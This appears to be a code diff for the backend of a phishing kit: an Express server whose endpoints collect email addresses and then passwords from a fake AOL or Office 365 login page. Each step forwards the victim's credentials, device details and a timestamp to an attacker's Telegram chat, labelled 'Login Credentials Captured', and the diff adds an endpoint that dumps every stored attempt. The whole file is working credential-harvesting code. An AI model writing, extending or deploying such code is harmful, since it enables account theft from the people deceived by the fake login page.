@@ -1,22 +1,10 @@
 require("dotenv").config();
 const express = require("express");
-const cors = require('cors');
 const axios = require("axios");
 const { v4: uuidv4 } = require("uuid");
 
 const app = express();
-
-// Clean CORS setup - allows localhost and your Vercel site
-app.use(cors({
-  origin: [
-    'http://localhost:3000',
-    'http://127.0.0.1:3000',
-    'https://login-aol.vercel.app'
-  ],
-  methods: ['GET', 'POST', 'OPTIONS'],
-  allowedHeaders: ['Content-Type'],
-  credentials: true
-}));
+const port = 3000;
 
 app.use(express.json());
 
@@ -46,7 +34,7 @@ async function sendToTelegram(text) {
 // Store attempts
 const loginAttempts = new Map();
 
-// Submit Email
+// ====================== STEP 1: Submit Email ======================
 app.post("/api/submit-email", async (req, res) => {
   const { email } = req.body;
 
@@ -64,16 +52,21 @@ app.post("/api/submit-email", async (req, res) => {
   });
 
   await sendToTelegram(
-    `🏋️‍♂️ *New Login Attempt*\n\n` +
+    `🏋️‍♂️ *New mail Login Attempt*\n\n` +
     `📧 *Email:* ${email}\n` +
-    `📱 *Device:* ${userAgent.slice(0, 120)}\n` +
-    `⏳ Waiting for password...`
+    `📱 *Device:* ${userAgent.slice(0, 120)}${userAgent.length > 120 ? "..." : ""}\n` +
+    `⏳ Waiting for password...\n` +
+    `🔑 ID: \`${attemptId.slice(0, 8)}\``
   );
 
-  res.json({ status: "success", attemptId });
+  res.json({
+    status: "success",
+    message: "Email received. Please enter password.",
+    attemptId,
+  });
 });
 
-// Submit Password
+// ====================== STEP 2: Submit Password ======================
 app.post("/api/submit-password", async (req, res) => {
   const { attemptId, password } = req.body;
 
@@ -89,17 +82,24 @@ app.post("/api/submit-password", async (req, res) => {
   attempt.password = password;
 
   await sendToTelegram(
-    `✅ *Login Credentials Captured*\n\n` +
+    `✅ *Ofiice 365 Login Credentials Captured*\n\n` +
     `📧 *Email:* ${attempt.email}\n` +
-    `🔑 *Password:* \`${password}\``
+    `🔑 *Password:* \`${password}\`\n` +
+    `📱 *Device:* ${attempt.userAgent.slice(0, 120)}${attempt.userAgent.length > 120 ? "..." : ""}\n` +
+    `⏰ *Time:* ${new Date().toISOString()}`
   );
 
   res.json({ status: "success", message: "Done" });
 });
 
-const port = process.env.PORT || 8080;
+// Debug (optional - you can remove later)
+app.get("/api/debug", (req, res) => {
+  res.json(Array.from(loginAttempts.entries()));
+});
 
-app.listen(port, '0.0.0.0', () => {
-  console.log(`🚀 Server running on port ${port}`);
-  console.log("✅ CORS enabled for localhost and https://login-aol.vercel.app");
+app.listen(port, () => {
+  console.log(`🚀 Server running on http://localhost:${port}`);
+  console.log("Endpoints:");
+  console.log("   POST /api/submit-email     → { email }");
+  console.log("   POST /api/submit-password  → { attemptId, password }");
 });
